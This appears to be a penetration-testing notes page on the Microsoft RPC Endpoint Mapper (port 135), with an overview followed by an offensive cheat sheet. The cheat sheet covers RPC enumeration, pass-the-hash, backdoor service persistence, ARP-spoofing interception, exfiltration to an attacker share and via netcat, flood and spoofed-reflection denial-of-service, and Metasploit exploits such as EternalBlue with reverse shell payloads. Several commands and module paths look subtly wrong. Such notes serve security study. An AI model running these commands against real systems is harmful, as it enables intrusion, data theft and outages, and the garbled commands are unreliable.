# Index
- [[Ports, Protocols, and Services]]
	- [[P111 RPCBind]]
	- [[P593 RPC HTTP Endpoint Mapper]]
	- [[P445 SMB]]

# RPC Microsoft Endpoint Mapper

- **Port Number:** 135
- **Protocol:** TCP/UDP
- **Service Name:** Microsoft RPC Endpoint Mapper
- **Defined in:** Microsoft Documentation (Various sources, e.g., MSDN)

The Remote Procedure Call (RPC) Microsoft Endpoint Mapper (often referred to as `epmap`) is a critical service in Microsoft Windows environments that facilitates communication between different software applications running on different machines. This service is responsible for directing RPC client requests to the appropriate server endpoint.

## Overview of Features

- **Dynamic Port Assignment:** The Endpoint Mapper is essential for the dynamic allocation of ports used by RPC services. When an RPC service starts, it registers itself with the Endpoint Mapper on port 135, which then directs clients to the correct dynamically assigned port.
  
- **Multi-Protocol Support:** The RPC Endpoint Mapper supports various network protocols, including TCP/IP, Named Pipes, and more, providing flexibility in how RPC communications are established.

- **Network Transparency:** By using the Endpoint Mapper, RPC communications are made transparent to the client, which only needs to know the server's IP address and port 135.

- **Security Mechanisms:** While historically less secure, modern implementations can leverage authentication and encryption to secure RPC communications, although misconfigurations can still lead to vulnerabilities.

## Typical Use Cases

- **Microsoft Active Directory:** The RPC Endpoint Mapper plays a critical role in the operation of Active Directory, particularly in domain controller communications.

- **Exchange Server:** Microsoft Exchange Server relies on RPC communications, facilitated by the Endpoint Mapper, to manage client connections and internal processes.

- **File and Print Services:** File and print sharing services in Windows environments often rely on RPC and the Endpoint Mapper for proper functioning.

- **Application Deployment and Management:** The Endpoint Mapper is used in various enterprise applications that require RPC for remote management, software deployment, and other administrative tasks.

## How RPC Microsoft Endpoint Mapper Works

1. **Service Registration:**
   - **Step 1:** An RPC server application starts on a Windows machine.
   - **Step 2:** The server application registers its service with the Endpoint Mapper on port 135, providing details such as the service name and the dynamic port number it will use.
   - **Step 3:** The Endpoint Mapper records this information and listens for incoming RPC requests.

2. **Client Request Initiation:**
   - **Step 4:** An RPC client application that needs to communicate with the server sends a request to the Endpoint Mapper at the server’s IP address on port 135.
   - **Step 5:** The request includes the specific service the client wishes to access.

3. **Endpoint Mapping:**
   - **Step 6:** The Endpoint Mapper checks its database for the requested service and retrieves the dynamic port number associated with it.
   - **Step 7:** The Endpoint Mapper responds to the client, providing the necessary port number for direct communication with the RPC service.

4. **Service Communication:**
   - **Step 8:** The client establishes a direct connection to the RPC service on the dynamic port provided by the Endpoint Mapper.
   - **Step 9:** RPC communication between the client and server takes place over this dynamically assigned port.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` contacts `<target_ip>` on port 135 to access "FileService".
- **Endpoint Mapper:** `<target_ip>` responds with port 49152 for "FileService".
- **Client:** `<attack_ip>` establishes communication with `<target_ip>` on port 49152.

# Additional Information

## Security Considerations
- **Attack Surface:** Port 135 is often targeted in attacks because it provides information about RPC services running on a machine. Vulnerabilities in the Endpoint Mapper service can be exploited for unauthorized access, privilege escalation, or denial of service.

- **Firewall Configuration:** Due to the potential for abuse, port 135 is often blocked by firewalls on external-facing networks. However, it remains open in internal networks, where RPC services are frequently used.

- **DCE/RPC (Distributed Computing Environment/Remote Procedure Call):** Microsoft’s implementation of RPC is based on the Open Software Foundation's DCE/RPC standard, which adds complexity and additional potential vulnerabilities.

- **MSRPC:** Microsoft's implementation of the RPC protocol suite includes several extensions that are unique to the Windows environment. Misconfigurations or flaws in these implementations have historically led to several critical vulnerabilities.

## Alternatives
- **DCOM (Distributed Component Object Model):** Often used alongside RPC, DCOM relies on RPC for communication between software components distributed across networked computers.

- **WMI (Windows Management Instrumentation):** WMI can be used as an alternative to RPC in some scenarios, particularly for system administration tasks.

## Modes of Operation
- **Listening Mode:** The Endpoint Mapper constantly listens on port 135 for incoming requests, whether they originate from internal or external networks (if allowed by firewall rules).

- **Client-Server Communication:** After providing the client with the correct service port, the Endpoint Mapper typically does not play a further role in the ongoing communication between client and server.

## Configuration Files

The RPC Endpoint Mapper does not require specific configuration files as it is managed by the Windows Service Control Manager and operates based on system-wide settings.

## Relevant Registry Keys
- **Registry Path:** `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\`
  - **`Ports`:** Specifies the range of dynamic ports used by RPC services.
  - **`RestrictRemoteClients`:** Controls access to the RPC service. Setting this key can limit access to the Endpoint Mapper, enhancing security.
  - **`EnableAuthEpResolution`:** Ensures that only authenticated clients can query the Endpoint Mapper, reducing the risk of information leakage.
- **Example Configuration:**
```registry
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\Internet]
"Ports"=hex(7):39,31,35,32,00
"PortsInternetAvailable"="Y"
"UseInternetPorts"="Y"
```
- **Explanation:**
  - `"Ports"`: Defines the range of ports used by RPC services.
  - `"PortsInternetAvailable"`: Specifies whether RPC services are available over the internet (should typically be "N" for security).
  - `"UseInternetPorts"`: Determines whether to use Internet ports.

## Potential Misconfigurations

1. **Open Port 135 on Public Networks:**
   - **Risk:** Leaving port 135 open on publicly accessible networks exposes the system to attacks such as MSRPC enumeration, which can lead to further exploitation.
   - **Exploitation:** Attackers can use tools to enumerate the services registered with the Endpoint Mapper, potentially revealing sensitive network information or gaining access to vulnerable services.

2. **Improper Dynamic Port Range Configuration:**
   - **Risk:** Incorrectly configured port ranges can lead to port conflicts or insufficient port availability, disrupting RPC services.
   - **Exploitation:** Attackers could exploit this to cause service disruptions or force the RPC service to use predictable ports, making it easier to attack.

3. **Lack of Access Restrictions:**
   - **Risk:** Not configuring access restrictions for the RPC Endpoint Mapper allows any network client to query it, potentially revealing internal network details.
   - **Exploitation:** Attackers can gather information about the services running on a machine and use it to plan further attacks.

## Default Credentials

The RPC Endpoint Mapper service does not use traditional authentication methods involving usernames and passwords. Instead, it relies on the underlying Windows security model, which can include NTLM or Kerberos authentication for access control.

- **Default Security Settings:** By default, the Endpoint Mapper is configured to allow access only to authenticated users on modern Windows systems. However, older systems or improperly configured environments might expose this service to unauthenticated users.

# Interaction and Tools

## Tools

### [[RPCInfo]]
- **Enumerate RPC Service:** Enumerate RPC services registered with RPCBind, which is crucial for understanding the attack surface.
    ```bash
    rpcinfo -p <target_ip>
    ```
- **Checking Specific Service:** Checks if a specific RPC service, identified by its program number, is available over TCP.
    ```bash
    rpcinfo -t <target_ip> <program_number>
    ```
- **Removing a Service:** Deregisters a specific service from RPCBind.
    ```bash
    rpcbind -d <program_number>
    ```
- **Monitoring RPCBind Activity:** Starts RPCBind with verbose logging to monitor all activities, useful for debugging or security audits.
    ```bash
    rpcbind -v
    ```
- **Restricting Access:** Binds RPCBind to a specific IP address, restricting its accessibility to a particular network interface.
    ```bash
    rpcbind -h <ip_address>
    ```

### [[RPCClient]]
- **Connect via username/password:**
	```bash
	rpcclient --user <username> --password '<password>' --workgroup <target_domain> //<target_ip>
	```

	```bash
	rpcclient -U <username>%<password> -W <target_omain> //<target_ip>
	```
- **Connect via password hash:**
	```bash
	rpcclient --user <username> --pw-nt-hash --workgroup <target_domain> //<target_ip>
	```
- **Connect via no password:**
	```bash
	rpcclient --user <username> --workgroup <target_domain> --no-pass //<target_ip>
	```
- **Connect via null session:**
	```bash
	rpcclient -N //<target_ip>
	```
- **Execute shell commands:**
	```bash
	rpcclient --user <username> --password '<password>' --workgroup <target_domain> --command <semicolon_separated_commands> //<target_ip>
	```

	```bash
	rpcclient -U alice%password -c "srvinfo" //192.168.1.100
	```
- **User enumeration:**
	```bash
	List users: querydispinfo and enumdomusers
	Get user details: queryuser <0xrid>
	Get user groups: queryusergroups <0xrid>
	GET SID of a user: lookupnames <username>
	Get users aliases: queryuseraliases [builtin|domain] <sid>
	```
- **Group enumeration:**
	```bash
	List groups: enumdomgroups
	Get group details: querygroup <0xrid>
	Get group members: querygroupmem <0xrid>
	```
- **Aliasgroup enumeration:**
	```bash
	List alias: enumalsgroups <builtin|domain>
	Get members: queryaliasmem builtin|domain <0xrid>
	```
- **Domain enumeration:**
	```bash
	List domains: enumdomains
	Get SID: lsaquery
	Domain info: querydominfo
	```
- **Share enumeration:**
	```bash
	Enumerate all available shares: netshareenumall
	Info about a share: netsharegetinfo <share>
	```
- **More SIDs:**
	```bash
	Find SIDs by name: lookupnames <username>
	Find more SIDs: lsaenumsid
	RID cycling (check more SIDs): lookupsids <sid>
	```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 135"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 135
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 135
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 135 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 135
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 135 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple test to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:135
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 135 -c 1
    ```

### [[Enum4Linux]]
- **Enumerate via username/password:** Enumerating information from Windows and Samba systems.
	```bash
	./enum4linux-ng.py -A -u <username> -p <password> -d <domain_controller_ip> <target_ip>
	```

### [[NetExec]]
### [[CrackMapExec]]
- **Connect via username/password:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p <password>
	```
- **Enumerate RPC:** Enumerate RPC services with authentication, useful for understanding the services available on a network.
    ```bash
    crackmapexec smb <target_ip> -u <username> -p <password> --rpc-enum
    ```

### [[Impacket]]

#### [[Impacket-RPCMap]]
- **Enumerate RPC:** Extracts a list of RPC services and their associated UUIDs, providing detailed information about the services running on the target.
	```bash
	impacket-rpcdump @<target_ip>
	```

## Other Techniques

### Brute-Force users RIDs
- **Brute-Force users RIDs:**
	```bash
	for i in $(seq 500 1100);do rpcclient -N -U "" <target_ip> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
	```

### Mount RPC Share Locally
- **Mount RPC Share Locally:**
	```bash
	sudo mount -t nfs <target_ip>:/remote/path /local/mount
	sudo rpc.mountd -o <options> <target_ip>:<share_name> /local/mount/point
	```

### GUI Connection from Linux
- **GUI Connection from Linux:**
	```bash
	xdg-open rpc://<target_ip>/
	```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 135
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 135
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

<br>

- **Tool:** [[RPCInfo]], [[Impacket-RPCDump]]
    ```bash
    impacket-rpcdump @<target_ip>
    ```
- **Description:** Enumerates the RPC services running on the target system, providing valuable information for subsequent attacks.

### Network Mapping
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_subnet>/24 -sV --script=rpc-grind 
    ```
- **Description:** Maps out all devices on a network that are running RPC services, identifying potential targets for exploitation.

### Exploiting Open Port 135
- **Tool:** [[Metasploit]]
    ```bash
    use auxiliary/scanner/dcerpc/endpoint_mapper
    set RHOSTS <target_ip>
    run
    ```
- **Description:** Use Metasploit to enumerate and identify vulnerable RPC services that can be exploited for initial access.

## Initial Access

### Pass-the-Hash via RPC
- **Tool:** [[Mimikatz Cheat Sheet]], [[CrackMapExec]]
    ```bash
    crackmapexec smb <target_ip> -u <username> -H <NTLM_hash> --rpc-enum
    ```
- **Description:** Use stolen NTLM hashes to authenticate to RPC services without needing the plaintext password.

## Persistence

### Service Hijacking
- **Tool:** [[Metasploit]], [[4. Tool Guides/Incomplete/PowerShell]]
    ```bash
    New-Service -Name "HijackedRPC" -Binary "C:\backdoor.exe" -Port 135
    ```
- **Description:** Hijack an existing RPC service to establish persistence within the target environment.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port <port>"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[ettercap]], [[BetterCap Cheat Sheet]]
	```bash
	ettercap -Tq -i <interface> -M arp:remote /<target_ip>/ /<server_ip>/
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

## Privilege Escalation

### Abuse of Misconfigured RPC Services
- **Tool:** [[Metasploit]], [[4. Tool Guides/Incomplete/PowerShell]]
    ```bash
    Get-Service | Where-Object { $_.DisplayName -like "*RPC*" }
    ```
- **Description:** Identify misconfigured or poorly secured RPC services that can be exploited for privilege escalation.

## Lateral Movement, Pivoting, and Tunnelling

### Pivoting Through RPC
- **Tool:** [[Impacket-RPCDump]]
    ```bash
    impacket-rpcdump /p <target_ip>
    ```
- **Description:** In a compromised environment, the Endpoint Mapper can be used to identify services that may allow for lateral movement. Identifies RPC services on internal machines, which can then be targeted for further exploitation.

### RPC Tunnelling
- **Tool:** [[SSH, [[NetCat]]
    ```bash
    ssh -L 135:<target_ip>:135 user@intermediate_host    
    ```
- **Description:** Set up a tunnel to access RPC services through an intermediate host, bypassing network restrictions.

### Lateral Movement via RPC
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Enter-PSSession -ComputerName <target_ip> -Credential (Get-Credential) -UseSSL
    ```
- **Description:** Moves laterally within a network by establishing RPC over HTTP/S connections to other machines.

## Defense Evasion

### Obfuscating Traffic
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]], [[Custom Scripts]]
    ```powershell
    powershell -encodedCommand <encoded_command>
    ```
- **Description:** Obfuscate RPC-related traffic to evade detection by security monitoring tools.

### Hiding RPC Traffic
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]], [[Custom Scripts]]
    ```bash
    New-NetFirewallRule -DisplayName "Allow RPC" -Direction Outbound -Protocol TCP -LocalPort 135
    ```
- **Description:** Modify firewall rules to allow RPC traffic without triggering alarms, aiding in stealthy communication.

### Bypassing Firewalls
- **Tool:** [[RPCClient]]
     ```bash
    rpcclient <target_ip> -c 'epmapper'
    ```
- **Description:** If the Endpoint Mapper is accessible but certain RPC services are blocked by a firewall, it might be possible to discover the dynamic ports assigned to these services and attempt to connect directly. Enumerates RPC services and their dynamic ports, allowing you to attempt connections even if the standard RPC ports are blocked.

## Data Exfiltration

### Covert Data Exfiltration via RPC
- **Tool:** [[Custom Scripts]], [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Get-Content C:\sensitive_data.txt | Out-File -FilePath "\\<attack_ip>\share\data.txt" }
    ```
- **Description:** Exfiltrates data by sending it over an RPC over HTTP connection, which may bypass traditional data loss prevention (DLP) measures.

### Covert Data Exfiltration via RPC
- **Tool:** [[Custom Scripts]], [[NetCat]]
    ```bash
    echo "secret_data" | nc <target_ip> 135
    
    nc <target_ip> 135 < secret_data.txt
    ```
- **Description:** Use RPC communications to covertly exfiltrate data from the target network.

### Exfiltration via Dynamic Ports
- **Tool:** [[Metasploit]], [[Scapy]]
    ```python
    send(IP(dst="<target_ip>")/TCP(dport=49152)/Raw(load="exfil_data"))
    ```
- **Description:** Leverage dynamically assigned RPC ports to exfiltrate data, making it harder to detect.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra rpc://<target_ip> -s 135 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra rpc://<target_ip> -s 135 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

## Exploits 

### MS17-010 (EternalBlue)
- **Tool:** [[Metasploit]], [[Custom Scripts]]
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set PAYLOAD windows/meterpreter/reverse_tcp
    set RHOST <target_ip>
    run
    ```
- **Description:** Exploits a vulnerability in Microsoft's implementation of the SMB protocol that could allow remote code execution. This exploit was used in the WannaCry ransomware attack.

### MS08-067 (Conficker Worm)
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/windows/smb/ms08_067_netapi
    set PAYLOAD windows/meterpreter/reverse_tcp
    set RHOST <target_ip>
    run
    ```
- **Description:** Exploits a vulnerability in the Server service's handling of RPC requests, allowing for remote code execution.

### MS03-026 (Blaster Worm)
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/windows/smb/ms03_026_dcom
    set RHOST <target_ip>
    run
    ```
- **Description:** A critical vulnerability in the RPC interface that allowed remote code execution. Exploits a heap overflow in the RPCSS service to execute arbitrary code with SYSTEM privileges.

### Rpcbomb (CVE-2003-0681)
- **Tool:** [[Custom Scripts]], [[Metasploit]]
	```bash
	use exploit/unix/rpc/rpcbomb
	set RHOST <target_ip>
	run
	```
- **Description:** Exploit RPCBind to crash or execute arbitrary code on the target system.

### Microsoft Windows RPC DCOM Vulnerability (CVE-2003-0352)
- **Tool:** [[Custom Scripts]], [[Metasploit]]
- **Description:** A critical vulnerability in Microsoft Windows' RPC implementation, allowing remote code execution.

### Linux rpc.ugidd Buffer Overflow
- **Tool:** [[Custom Scripts]], [[Metasploit]]
- **Description:** A buffer overflow in the rpc.ugidd service that could allow arbitrary code execution.

# Resources

|**Website**|**URL**|
|-|-|
|MSRPC Documentation|https://docs.microsoft.com/en-us/windows/win32/rpc/|
|Nmap RPC Scripts|https://nmap.org/nsedoc/scripts/rpc-grind.html|
|Impacket Toolset|https://github.com/SecureAuthCorp/impacket|
|Metasploit Framework|https://www.metasploit.com/|
|Samba Suite|https://www.samba.org/|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|
|MS08-067 Vulnerability Details|https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067|
|MS17-010 Vulnerability Details|https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010|
|Microsoft Security Bulletin MS03-026|https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-026|